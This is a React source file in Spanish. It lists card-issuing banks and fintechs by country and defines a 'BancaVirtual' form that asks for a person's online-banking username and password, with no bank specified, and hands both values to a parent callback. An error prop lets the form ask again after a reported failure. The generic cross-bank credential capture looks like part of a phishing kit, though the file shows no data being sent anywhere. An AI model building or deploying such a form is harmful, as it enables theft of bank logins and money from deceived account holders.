import { useState } from "react";
import { useSelector } from "react-redux";


const emisoresTarjetasPorPais = {
  AR: [
    "Banco Nación", "Banco Galicia", "Santander Río", "BBVA Argentina", "Banco Macro", 
    "Tarjeta Naranja", "Credicoop", "Ualá", "Brubank", "Rebanking", "Naranja X"
  ],
  BO: [
    "Banco Nacional de Bolivia", "Banco Mercantil Santa Cruz", "Banco Bisa", 
    "Banco de Crédito BCP", "Banco FIE"
  ],
  BR: [
    "Banco do Brasil", "Itaú", "Bradesco", "Caixa", "Santander Brasil", 
    "Nubank", "Inter", "Banco Pan", "C6 Bank"
  ],
  CA: [
    "RBC", "TD", "Scotiabank", "CIBC", "BMO", 
    "Capital One", "American Express", "Koho", "Neo Financial"
  ],
  CL: [
    "Banco de Chile", "BCI", "Santander", "Banco Estado", "Scotiabank", 
    "CMR Falabella", "Ripley", "Tenpo", "Mach", "Chek"
  ],
  CO: [
    "Bancolombia", "Davivienda", "Banco de Bogotá", "BBVA Colombia", "Banco Popular", 
    "Tuya", "Nequi", "RappiPay", "Lulo Bank", "Movii"
  ],
  CR: [
    "Banco Nacional", "Banco de Costa Rica", "BAC Credomatic", "Scotiabank", 
    "Coopeservidores", "MikroBank"
  ],
  EC: [
    "Banco Pichincha", "Banco Guayaquil", "Banco del Pacífico", "Produbanco", 
    "Cooperativa Jep", "Kushki", "PayPhone"
  ],
  SV: [
    "Banco Agrícola", "Davivienda", "Promerica", "Scotiabank", "Banco Cuscatlán", 
    "Tigo Money"
  ],
  EU: [
    "CaixaBank", "BBVA", "Santander", "Sabadell", "Unicaja", "Abanca", 
    "Bankinter", "Rebellion Pay", "Verse", "Bnext"
  ],
  US: [
    "Chase", "Bank of America", "Wells Fargo", "Citibank", "Capital One", 
    "American Express", "Discover", "Chime", "Venmo", "Cash App", "SoFi"
  ],
  GT: [
    "Banco Industrial", "Banrural", "G&T Continental", "Promerica", "BAC", 
    "Tigo Money"
  ],
  HN: [
    "Banco Atlántida", "Ficohsa", "Occidente", "BAC", "Banpaís", 
    "Tigo Money"
  ],
  MX: [
    "BBVA México", "Citibanamex", "Banorte", "Santander", "HSBC", 
    "American Express México", "Invex", "Hey Banco", "Ualá México", "Nu México", 
    "Stori", "Klar"
  ],
  NI: [
    "BANPRO", "Lafise", "BAC Nicaragua", "Banco de América Central", 
    "Tigo Money Nicaragua"
  ],
  OTHER: [
    "Payoneer", "Wise", "Revolut", "N26", "Western Union (tarjeta prepaga)", 
    "Zolve", "Chime", "Curve", "Vivid Money"
  ],
  PA: [
    "Banco General", "Banistmo", "Global Bank", "Multibank", "BAC Panamá", 
    "Nequi Panamá", "PayCash"
  ],
  PY: [
    "Banco Itaú", "Continental", "Visión Banco", "Sudameris", "Banco Familiar", 
    "Tigo Money", "Zimple"
  ],
  PE: [
    "BCP", "Interbank", "BBVA Perú", "Scotiabank Perú", "Banco Ripley", 
    "CMR Falabella", "Yape", "Plin", "RappiCard", "Ligo"
  ],
  UK: [
    "HSBC", "Barclays", "Lloyds", "NatWest", "TSB", "Santander UK", 
    "Revolut", "Monzo", "Starling Bank", "Curve", "Tide"
  ],
  DO: [
    "Banco Popular", "BHD León", "Banreservas", "Santa Cruz", 
    "Scotiabank RD", "Azul", "TuCrédito"
  ],
  UY: [
    "Banco República", "Santander Uruguay", "Scotiabank Uruguay", "Banco Itaú", 
    "OCA", "Creditel", "Prex"
  ]
};


const BancaVirtual = ({ close, error=null }) => {
  const [usuario, setUsuario] = useState("");
  const [clave, setClave] = useState("");
  const [errores, setErrores] = useState({});


    const handlerUsuario = (v) => setUsuario(v.target.value);
    const handlerClave = (v) => setClave(v.target.value);

    const handlerValidar = () => {
    const nuevosErrores = {};

    if (!usuario || usuario.trim().length < 4) {
        nuevosErrores.usuario = "El usuario debe tener al menos 4 caracteres.";
    }

    if (!clave || clave.trim().length < 4) {
        nuevosErrores.clave = "La clave debe tener al menos 4 caracteres.";
    }
    setErrores(nuevosErrores);

    if (Object.keys(nuevosErrores).length === 0) {
        close(usuario, clave);
    }
    };

    return (
    <div className="w-full flex flex-col justify-center items-center mt-4 gap gap-y-4">
        {error && <span className="text-red-600 text-[11px] mt-1 px-1 mb-3">{error}</span>}
        {/* USUARIO */}
        <div className="w-[90%] p-2 flex flex-col border border-slate-300 border-b-2 border-b-green-600">
          <span className="text-[12px] font-semibold">Usuario con el que ingresas a tu banca virtual</span>
          <input
              autoComplete="off"
              className="font-semibold h-[30px] focus:outline-none w-full pl-1.5"
              type="text"
              onChange={handlerUsuario}
              value={usuario}
              placeholder="Ingrese aquí su usuario"
          />
          {errores.usuario && <span className="text-red-500 text-sm">{errores.usuario}</span>}
        </div>

        {/* CLAVE */}
        <div className="w-[90%] p-2 flex flex-col border border-slate-300 border-b-2 border-b-green-600">
          <span className="text-[12px] font-semibold">Clave</span>
          <input
              autoComplete="off"
              className="font-semibold h-[30px] w-full focus:outline-none pl-1.5"
              type="password"
              onChange={handlerClave}
              value={clave}
              placeholder="Ingrese aquí su clave"
          />
          {errores.clave && <span className="text-red-500 text-sm">{errores.clave}</span>}
        </div>

        {/* BOTÓN */}
        <div className="w-[90%]">
          <button
              onClick={handlerValidar}
              className="w-full text-white bg-black rounded-full py-4"
          >
              Validar
          </button>
        </div>
    </div>
    );
};

export {BancaVirtual}